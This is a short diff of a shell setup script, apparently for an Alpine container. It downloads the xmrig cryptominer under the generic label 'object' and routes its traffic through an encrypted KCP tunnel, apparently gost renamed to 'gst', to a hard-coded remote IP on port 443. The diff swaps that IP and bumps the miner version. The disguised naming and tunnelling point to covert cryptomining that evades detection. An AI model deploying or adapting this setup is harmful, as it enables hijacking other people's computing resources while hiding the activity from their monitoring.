@@ -15,7 +15,7 @@ wget https://github.com/sgerrand/alpine-pkg-glibc/releases/download/${LIBC}/glib
 apk add glibc-${LIBC}.apk 2>/dev/null
 rm -f glibc-${LIBC}.apk
 ## tnl
-TNL_REMOTE=${TNL_REMOTE:-212.237.6.194}
+TNL_REMOTE=${TNL_REMOTE:-198.204.227.235}
 TNL_ARGS=${TNL_ARGS:--L tcp://:8080/:8081 -F kcp://chacha20:123@${TNL_REMOTE}:443?ttl=60}
 TNL_VER=${TNL_VER:-2.4}
 TNL_MASK=${TNL_MASK:-gst}
@@ -40,7 +40,7 @@ if [ ! -e "$OBJ_CFG" ]; then
 fi
 
 ## object
-OBJ_VER=${OBJ_VER:-2.4.3}
+OBJ_VER=${OBJ_VER:-2.4.4}
 OBJ_NAME=${OBJ_NAME:-xmrig}
 OBJ_URL=${OBJ_URL:-https://github.com/xmrig/xmrig/releases/download/v${OBJ_VER}/${OBJ_NAME}-${OBJ_VER}-gcc7-xenial-amd64-no-api.tar.gz}
 
